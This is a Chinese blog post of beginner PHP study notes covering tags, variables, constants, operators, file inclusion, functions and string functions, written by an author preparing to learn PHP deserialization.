<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>从下水道开始尝试看懂php | Pale</title><meta name="keywords" content="php"><meta name="author" content="One"><meta name="copyright" content="One"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="有人明明以前看过php 过了几个月 想学反序列化了    竟然 看不明白  代码  属实铸币">
<meta property="og:type" content="article">
<meta property="og:title" content="从下水道开始尝试看懂php">
<meta property="og:url" content="http://example.com/2021/08/24/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E7%BB%83%E4%B9%A0/index.html">
<meta property="og:site_name" content="Pale">
<meta property="og:description" content="有人明明以前看过php 过了几个月 想学反序列化了    竟然 看不明白  代码  属实铸币">
<meta property="og:locale" content="zh_CH">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-08-24T09:04:47.000Z">
<meta property="article:modified_time" content="2023-03-21T05:33:26.984Z">
<meta property="article:author" content="One">
<meta property="article:tag" content="php">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/08/24/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E7%BB%83%E4%B9%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '从下水道开始尝试看懂php',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2023-03-21 13:33:26'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/sup.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pale" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">20</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Pale</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/list/"><i class="fa-fw fas fa-list"></i><span> List</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">从下水道开始尝试看懂php</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-08-24T09:04:47.000Z" title="Created 2021-08-24 17:04:47">2021-08-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-03-21T05:33:26.984Z" title="Updated 2023-03-21 13:33:26">2023-03-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="从下水道开始尝试看懂php"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>有人明明以前看过php 过了几个月 想学反序列化了    竟然 看不明白  代码  属实铸币</p>
</blockquote>
<span id="more"></span>

<h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><p>2021-8-24</p>
<h6 id="代码标记"><a href="#代码标记" class="headerlink" title="代码标记"></a>代码标记</h6><p>在PHP历史发展中，可以使用多种标记来区分PHP脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ASP标记：&lt;% php代码 %&gt;</span><br><span class="line">短标记：&lt;? Php代码 ?&gt;</span><br></pre></td></tr></table></figure>

<p>以上两种基本弃用，如果要使用那么需要在配置文件中开启</p>
<p><code>short_open_tag</code>和<code>asp_tags</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">脚本标记：&lt;script language=”php”&gt;php代码&lt;/script&gt;</span><br><span class="line">标准标记（常用）：&lt;?php php代码?&gt;</span><br></pre></td></tr></table></figure>

<h6 id="PHP注释"><a href="#PHP注释" class="headerlink" title="PHP注释"></a>PHP注释</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//：后面跟的所有内容都是注释</span><br><span class="line">\#：与//一样</span><br><span class="line">/**/：中间直到*/出现之前，全部都是注释</span><br></pre></td></tr></table></figure>

<h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><h6 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h6><p>提前定义的变量，系统定义的变量，存储许多需要用到的数据（预定义变量都是数组）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$_GET：获取所有表单以get方式提交的数据</span><br><span class="line"></span><br><span class="line">$_POST：POST提交的数据都会保存在此</span><br><span class="line"></span><br><span class="line">$_REQUEST：GET和POST提交的都会保存</span><br><span class="line"></span><br><span class="line">$GLOBALS：PHP中所有的全局变量</span><br><span class="line"></span><br><span class="line">$_SERVER：服务器信息</span><br><span class="line"></span><br><span class="line">$_SESSION：session会话数据</span><br><span class="line"></span><br><span class="line">$_COOKIE：cookie会话数据</span><br><span class="line"></span><br><span class="line">$_ENV：环境信息</span><br><span class="line"></span><br><span class="line">$_FILES：用户上传的文件信息</span><br></pre></td></tr></table></figure>

<h6 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h6><p>如果一个变量保存的值刚好是另外一个变量的名字，那么可以直接通过访问一个变量得到另外一个变量的值：在变量前面再多加一个$符号。</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824180005321.png" alt="image-20210824180005321"></p>
<h5 id="变量传值"><a href="#变量传值" class="headerlink" title="变量传值"></a>变量传值</h5><p><strong>值传递</strong>：将变量保存的值赋值一份，然后将新的值给另外一个变量保存（两个变量没有关系）</p>
<p><strong>引用传递</strong>：将变量保存的值所在的内存地址，传递给另外一个变量：两个变量指向同一块内存空间（两个变量是同一个值）$新变量 = &amp;$老变量;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//值传递</span><br><span class="line">$a = 10;</span><br><span class="line">$b = $a;</span><br><span class="line">$b = 5;</span><br><span class="line">echo $a,$b;</span><br><span class="line">##105</span><br><span class="line">//引用传递</span><br><span class="line">$c = 10;</span><br><span class="line">$d = &amp;$c;</span><br><span class="line">$c = 5;</span><br><span class="line">echo $c,$d;</span><br><span class="line">##55</span><br></pre></td></tr></table></figure>

<h5 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h5><p>常量：const/constant是一种在程序运行当中，不可改变的量（数据）<strong>一旦定义，通常数据不可改变（用户级别）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">定义形式</span><br><span class="line">define（&#x27;PI&#x27;,3.14）;//函数定义常量 define</span><br><span class="line">const PI = 3; //const关键字定义</span><br><span class="line"></span><br><span class="line">define(&#x27;-_-&#x27;,&#x27;smile&#x27;);//此类使用const会产生错误</span><br><span class="line">特殊访问函数  //echo constant(&#x27;-_-&#x27;); </span><br><span class="line">## smile</span><br></pre></td></tr></table></figure>

<h6 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h6><p>常用的几个系统常量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP_VERSION：PHP版本号</span><br><span class="line"></span><br><span class="line">PHP_INT_SIZE：整形大小</span><br><span class="line"></span><br><span class="line">PHP_INT_MAX：整形能表示的最大值（PHP中整形是允许出现负数：带符号）</span><br></pre></td></tr></table></figure>

<p>在PHP中还有一些特殊的常量，他们有双下划线开始+长两名+双下划线结束，这种常量称之为系统魔术常量：魔术常量的值通常会跟着环境变化，但是用户改变不了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__DIR__：当前被执行的脚本所在电脑的绝对路径</span><br><span class="line"></span><br><span class="line">__FILE__：当前被执行的脚本所在的电脑的绝对路径（带自己文件的名字）</span><br><span class="line"></span><br><span class="line">__LINE__：当前所属的行数</span><br><span class="line"></span><br><span class="line">__NAMESPACE__：当前所属的命名空间</span><br><span class="line"></span><br><span class="line">__CLASS__：当前所属的类</span><br><span class="line"></span><br><span class="line">__METHOD__：当前所属的方法</span><br></pre></td></tr></table></figure>

<p><strong>整数类型</strong></p>
<p>整数类型：保存整数数值（范围限制），4个字节存储数据，最大就是32位：42亿多。但是在PHP中默认是有符号类型（区分正负数）</p>
<p>在PHP中提供了四种整型的定义方式：十进制定义，二进制定义，八进制定义和十六进制定义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = 120;     //10进制</span><br><span class="line"></span><br><span class="line">$a=0b110;    //2进制</span><br><span class="line"></span><br><span class="line">$a=0120;     //8进制</span><br><span class="line"></span><br><span class="line">$a=0x120;    //16进制</span><br></pre></td></tr></table></figure>

<p>PHP中不需要用户复杂的去计算，提供了很多的函数进行转换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Decbin()：十进制转二进制</span><br><span class="line"></span><br><span class="line">Decoct()：十进制转八进制</span><br><span class="line"></span><br><span class="line">Dechex()：十进制转十六进制</span><br><span class="line"></span><br><span class="line">Bindec()：二进制转十进制</span><br></pre></td></tr></table></figure>

<p><strong>比较运算符</strong></p>
<p>比较运算：比较两个数据的大小，或者两个内容是否相同，返回的结果都是布尔类型：满足返回true，不满足返回false</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;：左边大于右边，返回结果true</span><br><span class="line">&gt;=：左边大于等于右边</span><br><span class="line">&lt;：左边小于右边</span><br><span class="line">&lt;=：左边小于或者等于右边</span><br><span class="line">==：左边的与右边的相同（大小相同）</span><br><span class="line">!=：左边的与右边的不同（大小不同）</span><br><span class="line">===：全等于，左边与右边相同：大小以及数据的类型都要相同</span><br><span class="line">!==：不全等于，只有大小或者类型不同</span><br></pre></td></tr></table></figure>

<p><strong>逻辑运算符</strong></p>
<p>逻辑运算：针对不同的结果进行匹配。满足条件返回true，不满足返回false</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;：逻辑与，左边的条件与右边的条件同时成立（两边结果都为true）</span><br><span class="line"></span><br><span class="line">||：逻辑或，左边的条件或者右边的条件只要有一个满足即可</span><br><span class="line"></span><br><span class="line">！：逻辑非，对已有条件进行取反，本身为true，取反结果就是false</span><br></pre></td></tr></table></figure>

<blockquote>
<p>逻辑与和逻辑或又称之为短路运算：如果第一个表达式结果已经满足条件了，那么就不会运行逻辑运算符后面的表达式：在书写代码的时候，尽量将出现概率最高的（能够直接判断出结果）的表达式放到第一位</p>
</blockquote>
<p><strong>连接运算符</strong></p>
<p>连接运算：是PHP中将多个字符串拼接的一种符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">. ：将两个字符串连接到一起</span><br><span class="line">.= ： 复合运算，将左边的内容与右边的内容连接起来，然后重新赋值给左边变量</span><br><span class="line">A .= b ===== A = A . b</span><br></pre></td></tr></table></figure>

<p><strong>错误抑制符</strong></p>
<p>在PHP中有一些错误可以提前预知，但是这些错误可能无法避免，但是又比希望报错给用户看，可以使用错误抑制符处理。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@：在可能出错的表达式前面使用@符号即可</span><br></pre></td></tr></table></figure>

<p><strong>三目</strong></p>
<p>有三个表达式参与的运算（分支结构）（可进行复合）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表达式1 ? 表达式2 : 表达式3</span><br></pre></td></tr></table></figure>

<p>表达式1成立。执行表达式2，否则执行表达式3</p>
<h6 id="自操作运算符"><a href="#自操作运算符" class="headerlink" title="自操作运算符"></a>自操作运算符</h6><p>自操作：自己操作自己的运算符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">++：在原来的值上+1</span><br><span class="line">--：在原来的值上-1</span><br><span class="line">$a = 1;</span><br><span class="line">$a++; // $a = $a + 1;</span><br></pre></td></tr></table></figure>

<p>在PHP中自操作符是可以放到变量前或者后：前置自操作和后置自操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = 1;</span><br><span class="line">$a++;</span><br><span class="line">++$a;    //前置或者后置如果本身只有自操作，不参与其他运算（自操作同时），那么效果是一样的。但是如果自操作同时还参与别的运算，那么效果就不一样</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = 1;</span><br><span class="line">$b = $a++;	//$a++会导致$a = $a + 1; $a = 2;，上面的$b = 1</span><br><span class="line">$c =++$a;		//++$a会导致$a = $a + 1; $a = 2;，$c = 2;</span><br></pre></td></tr></table></figure>

<p>后置自操作：先把自己所保存的值留下来，然后改变自己，自己给别人的值是原来的值；<br>前置自操作：先把自己改变，然后把改变后的值给别人。</p>
<p><strong>位运算符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp;: 按位与，两个都为1，结果为1</span><br><span class="line">|: 按位或，两个有一个为1，结果为1</span><br><span class="line">~ ： 按位非，如果为1则变为0</span><br><span class="line">^： 按位异或，两个相同为0，不同为1</span><br><span class="line">&lt;&lt;： 按位左移，向左移动一位，后边补0</span><br><span class="line">&gt;&gt;： 按位右移，类似于左移，补为对应内容，正数补0，负数补1</span><br></pre></td></tr></table></figure>

<h5 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h5><p>文件包含：在一个PHP脚本中，去将另外一个文件（PHP）包含进来，去合作完成一件事情。</p>
<p>文件包含的意义：</p>
<p>1、 要么使用被包含文件中的内容，实现代码的共享（重用）：向上包含（索要）</p>
<p>向上包含：在当前脚本要用某个代码之前包含别的文件</p>
<p>2、 要么自己有东西可以给别的文件使用，实现代码的共享（重用）：向下包含（给予）</p>
<p>向下包含：在自己有某个东西的时候，需要别的脚本来显示（自己代码写完之后包含其他文件）</p>
<p>最大的作用：分工协作，每个脚本做的事情不一样，因此可以使用协作方式，让多个脚本共同完成一件事情。</p>
<p>文件包含四种形式</p>
<p>在PHP中文件的包含有四种形式（两种大形式）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Include：包含文件 Include系统会碰到一次，执行一次；如果对统一个文件进行多次加载，那么系统会执行多次；</span><br><span class="line">Include_once：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）系统碰到多次，也只会执行一次。</span><br><span class="line">Require：与include相同</span><br><span class="line">Require_once：以include_once相同</span><br></pre></td></tr></table></figure>

<p><code>Include</code>的错误级别比较轻：不会阻止代码执行</p>
<p><code>Require</code>要求较高：如果包含出错代码不再执行（require后面的代码）</p>
<p>包含基本语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Include ‘文件名字’;</span><br><span class="line"></span><br><span class="line">Include(‘文件名字’);    //文件名字：路径问题</span><br></pre></td></tr></table></figure>

<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824182806590.png" alt="image-20210824182806590"></p>
<p>以上方式：是先包含文件，后使用文件中的内容（向上包含）</p>
<p>向下包含：先准备内容，然后包含另外的文件，在另外的文件中，使用当前的内容</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824183244631.png" alt="image-20210824183244631"></p>
<h6 id="PHP代码的执行流程"><a href="#PHP代码的执行流程" class="headerlink" title="PHP代码的执行流程"></a>PHP代码的执行流程</h6><blockquote>
<p>1、 读取代码文件（PHP程序）</p>
<p>2、 编译：将PHP代码转换成字节码（生成opcode）</p>
<p>3、zendengine来解析opcode，按照字节码去进行逻辑运算</p>
<p>4、 转换成对应的HTML代码</p>
</blockquote>
<h6 id="加载原理"><a href="#加载原理" class="headerlink" title="加载原理"></a>加载原理</h6><blockquote>
<p>1、 在文件加载（include或者require）时，系统会自动的将被包含文件中的代码相当于嵌入到当前文件中</p>
<p>2、 加载位置：在哪加载，对应的文件中的代码嵌入的位置就是对应的include位置</p>
<p>3、 在PHP中被包含的文件是单独进行编译的 </p>
</blockquote>
<p>PHP文件在编译的过程中如果出现了语法错误，那么会失败（不会执行）；但是如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错。</p>
<h6 id="文件加载路径"><a href="#文件加载路径" class="headerlink" title="文件加载路径"></a>文件加载路径</h6><p>文件加载路径<br>绝对路径：<code>例如：c:/windows/a.php（推荐使用）</code><br>相对路径：<code> 例如 ./a.php</code><br><code>   . ：代表的是当前文件所在位置</code><br><code>   ./：代表的是当前执行的脚本文件所在位置</code><br><code>   ../:代表上级目录</code></p>
<p><strong>文件嵌套包含</strong></p>
<p>文件嵌套包含：一个文件包含另外一个文件，同时被包含的文件又包含了另外一个文件。</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824183732882.png" alt="image-20210824183732882"> </p>
<p>嵌套包含的时候就很容易出现相对路径出错的问题：相对路径会因为文件的包含而改变（./和../）：windows下面，每一个文件夹下都有.和..的文件夹。</p>
<h1 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h1><p>2021-8-25</p>
<h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><p><strong>基本语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function 函数名([参数])&#123;</span><br><span class="line">	//函数体</span><br><span class="line">	//返回值：return 结果;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>参数（形参和实参）</strong></p>
<p>形参：形式参数，不具有实际意义的参数，是在函数定义时使用的参数</p>
<p>实参：实际参数，具有实际数据意义的参数，是在函数调用时使用的参数</p>
<p>形参是实参的载体：实参在调用时通常是需要传入到函数内部参与计算（运算），那么需要在函数内部去找到实际数据所在的位置才能找到数据本身：需要实际调用的时候，将数据以实参的形式传递给形参：给形参赋值，从而使得函数内部可以用到外部数据。</p>
<p><strong>默认值</strong>：在形参处给形参定义默认值。默认值放在参数的最右侧</p>
<p>参数的传递方式：值传递和引用传递</p>
<p>函数体：函数体里可以定义变量，常量，函数，分支语句，循环语句，调用其他函数</p>
<p>函数返回值：return：返回函数的运行结果，同时也终止return后续代码的执行</p>
<p>作用域：局部（函数体内），全局（函数体外），超全局（函数体内和函数体外）</p>
<p>静态变量语法：static 变量名=值;作用是为了跨函数共享数据（同一个函数被多次调用</p>
<p>可变函数：用一个变量报错函数名，调用时用该变量+括号，就能调用对应的函数</p>
<p>匿名函数语法：变量名=function(){函数体};    变量保存匿名函数，本质得到的是一个对象</p>
<p>闭包：函数内部有一些局部变量（要执行的代码块）在函数执行之后没有被释放，是因为在函数内部还有对应的函数在引用（函数的内部函数：匿名函数）</p>
<h5 id="伪类型"><a href="#伪类型" class="headerlink" title="伪类型"></a>伪类型</h5><p>mixed：混合类型包括八小类型<br>number：数值类型包括：整数类型和浮点型</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825153013850.png" alt="image-20210825153013850"></p>
<h5 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h5><p>系统常用的函数<br>输出函数：<code>print_r(),var_dump()</code><br>时间函数：<code>date(),time(),microtime(),strtotime()</code><br>数学函数：<code>max(),min(),rand(),mt_rand(),round(),ceil(),floor(),pow(),abs(),sqrt()</code><br>有关函数的函数:function_exists()：判断指定的函数名字是否在内存中存在（帮助用户不去使用一个不存在的函数，让代码安全性更高）</p>
<p>func_get_arg()：在自定义函数中去获取指定数值对应的参数</p>
<p>func_get_args()：在自定义函数中获取所有的参数（数组）</p>
<p>func_num_args()：获取当前自定义函数的参数数量   设置php.ini的配置文件信息：<code>ini_set(&#39;配置项&#39;,配置值)</code></p>
<h5 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h5><p> PHP单引号，和双引号能识别的转义符：单引号中能够识别\’，而双引号中就不能识别\’</p>
<p><strong>字符串函数</strong><br>  strlen(),mb_strlen()</p>
<p>1）转换函数：implode(), explode(), str_split()</p>
<p>Implode(连接方式,数组)：将数组中的元素按照某个规则连接成一个字符串</p>
<p>Explode(分割字符,目标字符串)：将字符串按照某个格式进行分割，变成数组</p>
